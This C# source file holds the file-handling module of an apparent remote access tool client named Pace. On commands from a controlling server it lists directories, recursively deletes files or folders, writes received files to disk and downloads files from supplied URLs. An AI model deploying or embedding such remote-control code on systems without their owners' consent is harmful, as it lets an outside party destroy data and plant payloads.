using Pace.Client.System;
using Pace.Client.Web;
using Pace.Common.Model;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using Pace.Common.Network.Packets.Server;
using System;
using System.IO;
using System.Linq;
using System.Security;

namespace Pace.Client.Handlers;

public static class FileHandlers
{
    public static void HandleGetDirectory(PaceClient client, IPacket packet)
    {
        var getDirectoryPacket = (GetDirectoryRequestPacket)packet;

        string path = getDirectoryPacket.Path == string.Empty ? Environment.GetFolderPath(Environment.SpecialFolder.Windows) : getDirectoryPacket.Path;

        GetDirectoryFileEntries(client, path);
    }

    public static void HandleDeleteFile(PaceClient client, IPacket packet)
    {
        var deleteFilePacket = (DeleteFileRequestPacket)packet;

        var directory = Directory.GetParent(deleteFilePacket.Path).FullName;

        if (Directory.Exists(deleteFilePacket.Path))
        {
            Directory.Delete(deleteFilePacket.Path, true);
        }
        else if (File.Exists(deleteFilePacket.Path))
        {
            File.Delete(deleteFilePacket.Path);
        }

        GetDirectoryFileEntries(client, directory);
    }

    public static void HandleSendFile(PaceClient client, IPacket packet)
    {
        var sendFilePacket = (SendFileRequestPacket)packet;
        File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
    }

    public static void HandleDownloadFile(PaceClient client, IPacket packet)
    {
        var downloadFilePacket = (DownloadFileRequestPacket)packet;
        new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
    }

    private static void GetDirectoryFileEntries(PaceClient client, string path)
    {
        try
        {
            var directory = new DirectoryInfo(path);

            if (!directory.Exists)
                return;

            FileSystemEntry[] folders = FileExplorer.GetDirectories(path);
            FileSystemEntry[] files = FileExplorer.GetFiles(path);

            var response = new GetDirectoryResponsePacket
            {
                Name = directory.Name,
                Path = directory.FullName,
                Folders = folders.Select(folder => folder.Name).ToArray(),
                Files = files.Select(file => file.Name).ToArray(),
                FileSizes = files.Select(file => file.Size).ToArray()
            };

            client.SendPacket(response);
        }
        catch (SecurityException)
        {
            NotifyStatus(client, "Insufficient privileges.");
        }
        catch (ArgumentException)
        {
            NotifyStatus(client, "Invalid path.");
        }
        catch (Exception)
        {
            NotifyStatus(client, "An unexpected error has occured.");
        }
    }

    private static void NotifyStatus(PaceClient client, string statusMessage)
    {
        client.SendPacket(new NotifyStatusResponsePacket(statusMessage));
    }
}